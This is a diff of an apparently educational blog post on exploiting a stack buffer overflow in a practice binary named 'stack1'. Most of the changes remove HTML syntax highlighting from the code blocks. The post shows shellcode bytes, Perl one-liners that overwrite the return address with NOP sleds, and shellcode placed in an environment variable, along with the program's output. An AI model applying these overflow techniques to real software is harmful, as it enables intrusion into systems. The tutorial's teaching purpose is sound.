-<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
-<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> 0a                                 <span class="p">|</span> win!.<span class="p">|</span>
-<span class="m">00000026</span>
-</code></pre></div>
+<pre><code># hexdump -C shellcode.bin
+00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 09 cd  |..1.1.1.....Y...|
+00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
+00000020  20 77 69 6e 21 0a                                 | win!.|
+00000026
+</code></pre>
 
 <p>The shellcode above is copied into the <code>buf</code> array through the <code>gets</code>
 function, which parses newline or EoF as input terminating characters.
@@ -793,13 +793,13 @@ shellcode that has the message with no newline character. However, a
 quick hack can be to remove the newline from the exploit command-line
 and test it:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
+<pre><code># perl -e 'print "\x90"x50 . "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a" . "\xd4\xf4\xff\xbf"' | ./stack1
 buf: bffff4d4 cookie: bffff524
-<span class="c1">#</span>
-<span class="c1"># perl -e &#39;print &quot;\x90&quot;x51 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
+#
+# perl -e 'print "\x90"x51 . "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21" . "\xd4\xf4\xff\xbf"' | ./stack1
 buf: bffff4d4 cookie: bffff524
 you win!
-</code></pre></div>
+</code></pre>
 
 <p>It did work! Although a junk byte was appended to the winning message,
 it really does not matter for this example. We are clear (hopefully :)
@@ -875,50 +875,50 @@ shellcode. If you have any queries regarding environment variable based
 exploitation, please refer <strong>section 0x331 Using the Environment</strong> from
 <a href="https://www.nostarch.com/hacking2.htm">Hacking - The Art of Exploitation</a> book:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># export WINCODE=$(cat shellcode.bin)</span>
-<span class="c1">#</span>
-<span class="c1"># echo $WINCODE | hexdump -C</span>
-<span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">20</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y. .<span class="p">|</span>
-<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
-<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> 0a                                 <span class="p">|</span> win!.<span class="p">|</span>
-<span class="m">00000026</span>
-<span class="c1">#</span>
-<span class="c1"># ./getenv WINCODE</span>
-<span class="o">[</span>+<span class="o">]</span> WINCODE: 0xbffff718
-<span class="c1">#</span>
-<span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;&#39; | ./stack1</span>
+<pre><code># export WINCODE=$(cat shellcode.bin)
+#
+# echo $WINCODE | hexdump -C
+00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
+00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
+00000020  20 77 69 6e 21 0a                                 | win!.|
+00000026
+#
+# ./getenv WINCODE
+[+] WINCODE: 0xbffff718
+#
+# perl -e 'printf "A"x88 . "\x18\xf7\xff\xbf"' | ./stack1
 buf: bffff4d4 cookie: bffff524
 you win!#
-</code></pre></div>
+</code></pre>
 
 <p>We successfully redirected EIP to a NOP-less shellcode present within an
 environment variable. And it did work! However the output is not exactly
 what we had expected. There&#8217;s no newline at the end. Here is what
 hexdump has to say about our exploit:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;&#39; | ./stack1 | hexdump -C</span>
-<span class="m">00000000</span>  <span class="m">79</span> 6f <span class="m">75</span> <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span>  <span class="m">00</span>                       <span class="p">|</span>you win!.<span class="p">|</span>
-<span class="m">00000009</span>
-</code></pre></div>
+<pre><code># perl -e 'printf "A"x88 . "\x18\xf7\xff\xbf"' | ./stack1 | hexdump -C
+00000000  79 6f 75 20 77 69 6e 21  00                       |you win!.|
+00000009
+</code></pre>
 
 <p>Although the environment variable has a newline at the end, it is not
 echoed back when the shellcode executes. I made a small change to the
 original shellcode to include <code>0x0a</code> and <code>0x0d</code> characters and used it for
 testing:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a\x0d&quot;&#39; &gt;shellcode.bin</span>
-<span class="c1">#</span>
-<span class="c1"># export WINCODE=$(cat shellcode.bin)# echo $WINCODE | hexdump -C 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|</span>
-<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
-<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> <span class="m">20</span> 0d 0a                           <span class="p">|</span> win! ..<span class="p">|</span>
-<span class="m">00000028</span>
-<span class="c1">#</span>
-<span class="c1"># ./getenv WINCODE[+] WINCODE: 0xbffff716</span>
-<span class="c1">#</span>
-<span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x16\xf7\xff\xbf&quot;&#39; | ./stack1</span>
+<pre><code># perl -e 'print "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a\x0d"' &gt;shellcode.bin
+#
+# export WINCODE=$(cat shellcode.bin)# echo $WINCODE | hexdump -C 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
+00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
+00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
+00000028
+#
+# ./getenv WINCODE[+] WINCODE: 0xbffff716
+#
+# perl -e 'printf "A"x88 . "\x16\xf7\xff\xbf"' | ./stack1
 buf: bffff4d4 cookie: bffff524
 you win!
-</code></pre></div>
+</code></pre>
 
 <p>This time just the <code>0x0a</code> was echoed back and it, as expected, corrects
 the exploit output. However, I could not understand this strange
@@ -946,7 +946,7 @@ introduced.</p>
                 </tr>
                 <tr>
                                       <td align="left"><a href="/2012/exploit-mitigation-techniques-on-linux.html">&lt;&lt; Exploit Mitigation Techniques on Linux Systems &lt;&lt;</a></td>
-                    <td align="right"><a href="/2012/shadow-stream-recorder-asx-jmpesp.html">&gt;&gt; Shadow Stream Recorder .asx File Parsing Buffer Overflow &gt;&gt;</a></td>
+                    <td align="right"><a href="/2012/soritong-m3u-seh-overflow.html">&gt;&gt; SoriTong MP3 Player .m3u File Parsing SEH Overflow &gt;&gt;</a></td>
                                   </tr>
               </table>
                                                                                                                                                                                                                                                             </div>
